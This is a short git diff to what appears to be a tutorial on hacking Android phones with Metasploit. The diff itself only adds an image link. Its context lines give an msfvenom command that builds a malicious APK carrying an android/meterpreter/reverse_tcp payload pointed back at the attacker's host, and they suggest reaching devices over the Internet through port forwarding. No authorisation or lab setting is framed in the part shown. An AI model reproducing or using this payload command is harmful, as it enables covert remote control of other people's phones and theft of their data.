@@ -29,6 +29,7 @@ IMPLEMENTATION:
 1.	Generating a Payload with msfvenom
 Start Kali Linux so that we may generate an apk file as a malicious payload. We need to check our local IP that turns out to be ‘192.168.0.112’. You can also hack an Android device through Internet by using your Public/External IP in the LHOST and by port forwarding.
  
+ ![image](https://user-images.githubusercontent.com/81562207/229279048-8c5be979-a8ca-4f33-8755-44de904783ae.png)
 
 After getting your Local host IP use msfvenom tool that will generate a payload to penetrate the Android device. Type command:
 # msfvenom –p android/meterpreter/reverse_tcp LHOST=192.168.0.112 LPORT=4444 R> /var/www/html/ehacking.apk
